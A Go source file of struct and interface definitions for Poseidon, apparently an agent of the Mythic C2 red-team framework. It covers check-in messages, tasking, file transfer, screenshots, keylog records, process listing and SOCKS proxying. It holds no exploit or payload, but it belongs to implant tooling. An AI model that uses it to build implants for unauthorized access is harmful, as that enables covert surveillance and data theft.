package structs

import (
	"encoding/json"
	"net"
	"os"
)

// Profile is the primary client interface for Mythic C2 profiles
type Profile interface {
	// CheckIn method for sending the initial checkin to the server
	CheckIn() interface{}
	// PostResponse is used to send a task response to the server
	SendMessage(output []byte) interface{}
	// NegotiateKey starts the Encrypted Key Exchange (EKE) negotiation for encrypted communications
	NegotiateKey() bool
	// Get the name of the c2 profile
	ProfileType() string
	// Start the main C2 profile tasking loop or listening loop
	Start()
	// Set Sleep Interval
	SetSleepInterval(interval int) string
	// Set sleep Jitter
	SetSleepJitter(jitter int) string
	// Get Sleep time
	GetSleepTime() int
}

// Struct definition for CheckIn messages
type CheckInMessage struct {
	Action         string   `json:"action"`
	IPs            []string `json:"ips"`
	OS             string   `json:"os"`
	User           string   `json:"user"`
	Host           string   `json:"host"`
	Pid            int      `json:"pid"`
	UUID           string   `json:"uuid"`
	Architecture   string   `json:"architecture"`
	Domain         string   `json:"domain"`
	IntegrityLevel int      `json:"integrity_level"`
	ExternalIP     string   `json:"external_ip"`
	ProcessName    string   `json:"process_name"`
}

type CheckInMessageResponse struct {
	Action string `json:"action"`
	ID     string `json:"id"`
	Status string `json:"status"`
}

// Struct definitions for EKE-RSA messages

type EkeKeyExchangeMessage struct {
	Action    string `json:"action"`
	PubKey    string `json:"pub_key"`
	SessionID string `json:"session_id"`
}

type EkeKeyExchangeMessageResponse struct {
	Action     string `json:"action"`
	UUID       string `json:"uuid"`
	SessionKey string `json:"session_key"`
	SessionId  string `json:"session_id"`
}

// Struct definitions for Tasking request messages

type MythicMessage struct {
	Action           string                  `json:"action"`
	TaskingSize      int                     `json:"tasking_size"`
	GetDelegateTasks bool                    `json:"get_delegate_tasks"`
	Delegates        *[]DelegateMessage      `json:"delegates,omitempty"`
	Responses        *[]json.RawMessage      `json:"responses,omitempty"`
	Socks            *[]SocksMsg             `json:"socks,omitempty"`
	Edges            *[]P2PConnectionMessage `json:"edges,omitempty"`
}

type MythicMessageResponse struct {
	Action    string            `json:"action"`
	Tasks     []Task            `json:"tasks"`
	Delegates []DelegateMessage `json:"delegates"`
	Socks     []SocksMsg        `json:"socks"`
	Responses []json.RawMessage `json:"responses"`
}

type Task struct {
	Command   string  `json:"command"`
	Params    string  `json:"parameters"`
	Timestamp float64 `json:"timestamp"`
	TaskID    string  `json:"id"`
	Job       *Job
}

type Job struct {
	Stop                               *int
	C2                                 Profile
	ReceiveResponses                   chan (json.RawMessage)
	SendResponses                      chan (Response)
	SendFileToMythic                   chan (SendFileToMythicStruct)
	GetFileFromMythic                  chan (GetFileFromMythicStruct)
	FileTransfers                      map[string](chan json.RawMessage)
	SaveFileFunc                       func(fileUUID string, data []byte)
	RemoveSavedFile                    func(fileUUID string)
	GetSavedFile                       func(fileUUID string) []byte
	CheckIfNewInternalTCPConnection    func(newInternalConnectionString string) bool
	AddNewInternalTCPConnectionChannel chan (net.Conn)
	RemoveInternalTCPConnectionChannel chan (string)
}

type SendFileToMythicStruct struct {
	// the following are set by calling Task
	Task         *Task
	IsScreenshot bool
	// if this came from on disk, this would be the filename, otherwise it's just a nice way to identify the file
	FileName              string
	SendUserStatusUpdates bool
	//set this if the file belong on disk so we know where it came from
	FullPath string
	// must supply either the raw bytes (Data) to transfer for the File that should be read and chunked
	Data *[]byte
	File *os.File
	// channel to indicate once the file transfer has finished so that the task can act accordingly
	FinishedTransfer chan (int)
	// the following are set and used by Poseidon, Task doesn't use
	// two components used by Poseidon internally to track and handle chunk responses from Mythic for this specific file transfer
	TrackingUUID         string
	FileTransferResponse chan (json.RawMessage)
}
type GetFileFromMythicStruct struct {
	// the following are set by the calling Task
	Task                  *Task
	FullPath              string
	FileID                string
	SendUserStatusUpdates bool
	// set by the calling Task to receive data from Mythic one chunk at a time
	ReceivedChunkChannel chan ([]byte)
	// the following are set and used by Poseidon, Task doesn't use
	TrackingUUID         string
	FileTransferResponse chan (json.RawMessage)
}

type ProcessDetails struct {
	ProcessID           int                    `json:"process_id"`
	ParentProcessID     int                    `json:"parent_process_id"`
	Arch                string                 `json:"architecture"`
	User                string                 `json:"user"`
	BinPath             string                 `json:"bin_path"`
	Arguments           []string               `json:"args"`
	Environment         map[string]interface{} `json:"env"`
	SandboxPath         string                 `json:"sandboxpath"`
	ScriptingProperties map[string]interface{} `json:"scripting_properties"`
	Name                string                 `json:"name"`
	BundleID            string                 `json:"bundleid"`
}
type Keylog struct {
	User        string `json:"user"`
	WindowTitle string `json:"window_title"`
	Keystrokes  string `json:"keystrokes"`
}
type Artifact struct {
	BaseArtifact string `json:"base_artifact"`
	Artifact     string `json:"artifact"`
}

type Response struct {
	TaskID          string               `json:"task_id"`
	UserOutput      string               `json:"user_output,omitempty"`
	Completed       bool                 `json:"completed,omitempty"`
	Status          string               `json:"status,omitempty"`
	FileBrowser     *FileBrowser         `json:"file_browser,omitempty"`
	RemovedFiles    *[]RmFiles           `json:"removed_files,omitempty"`
	Processes       *[]ProcessDetails    `json:"processes,omitempty"`
	TrackingUUID    string               `json:"tracking_uuid,omitempty"`
	Upload          *FileUploadMessage   `json:"upload,omitempty"`
	Download        *FileDownloadMessage `json:"download,omitempty"`
	Keylogs         *[]Keylog            `json:"keylogs,omitempty"`
	Artifacts       *[]Artifact          `json:"artifacts,omitempty"`
	ProcessResponse *string              `json:"process_response,omitempty"`
}

func (r *Response) SetError(errString string) {
	r.UserOutput = errString
	r.Status = "error"
	r.Completed = true
}

type PermissionJSON struct {
	Permissions string `json:"permissions"`
}

type RmFiles struct {
	Path string `json:"path"`
	Host string `json:"host"`
}

type FileBrowser struct {
	Files        []FileData     `json:"files"`
	IsFile       bool           `json:"is_file"`
	Permissions  PermissionJSON `json:"permissions"`
	Filename     string         `json:"name"`
	ParentPath   string         `json:"parent_path"`
	Success      bool           `json:"success"`
	FileSize     int64          `json:"size"`
	LastModified int64          `json:"modify_time"`
	LastAccess   int64          `json:"access_time"`
}

type FileData struct {
	IsFile       bool           `json:"is_file"`
	Permissions  PermissionJSON `json:"permissions"`
	Name         string         `json:"name"`
	FullName     string         `json:"full_name"`
	FileSize     int64          `json:"size"`
	LastModified int64          `json:"modify_time"`
	LastAccess   int64          `json:"access_time"`
}

type DelegateMessage struct {
	Message       string `json:"message"`
	UUID          string `json:"uuid"`
	C2ProfileName string `json:"c2_profile"`
	MythicUUID    string `json:"new_uuid,omitempty"`
}

type FileUploadMessage struct {
	ChunkSize   int    `json:"chunk_size"`
	TotalChunks int    `json:"total_chunks"`
	FileID      string `json:"file_id"`
	ChunkNum    int    `json:"chunk_num"`
	FullPath    string `json:"full_path"`
	ChunkData   string `json:"chunk_data"`
}
type FileDownloadMessage struct {
	TotalChunks  int    `json:"total_chunks"`
	ChunkNum     int    `json:"chunk_num"`
	FullPath     string `json:"full_path"`
	ChunkData    string `json:"chunk_data"`
	FileID       string `json:"file_id,omitempty"`
	IsScreenshot bool   `json:"is_screenshot,omitempty"`
}

type FileUploadMessageResponse struct {
	TotalChunks int    `json:"total_chunks"`
	ChunkNum    int    `json:"chunk_num"`
	ChunkData   string `json:"chunk_data"`
	FileID      string `json:"file_id"`
}
type P2PConnectionMessage struct {
	Source        string `json:"source"`
	Destination   string `json:"destination"`
	Action        string `json:"action"`
	C2ProfileName string `json:"c2_profile"`
}

// TaskStub to post list of currently processing tasks.
type TaskStub struct {
	Command string `json:"command"`
	Params  string `json:"params"`
	ID      string `json:"id"`
}

type FileBrowserArguments struct {
	File        string `json:"file"`
	Path        string `json:"path"`
	Host        string `json:"host"`
	FileBrowser bool   `json:"file_browser"`
}

// Struct for dealing with Socks messages
type SocksMsg struct {
	ServerId uint32 `json:"server_id"`
	Data     string `json:"data"`
	Exit     bool   `json:"exit"`
}

// Message - struct definition for external C2 messages
type Message struct {
	Tag    string `json:"tag"`
	Client bool   `json:"client"`
	Data   string `json:"data"`
}

// ToStub converts a Task item to a TaskStub that's easily
// transportable between client and server.
func (t *Task) ToStub() TaskStub {
	return TaskStub{
		Command: t.Command,
		ID:      t.TaskID,
		Params:  t.Params,
	}
}

func (t *Task) ShouldStop() bool {
	if *t.Job.Stop == 1 {
		msg := Response{}
		msg.TaskID = t.TaskID
		msg.UserOutput = "\nTask Cancelled"
		msg.Completed = true
		msg.Status = "Err: User Cancelled"
		t.Job.SendResponses <- msg
		return true
	} else {
		return false
	}
}
func (t *Task) DidStop() bool {
	return *t.Job.Stop == 1
}
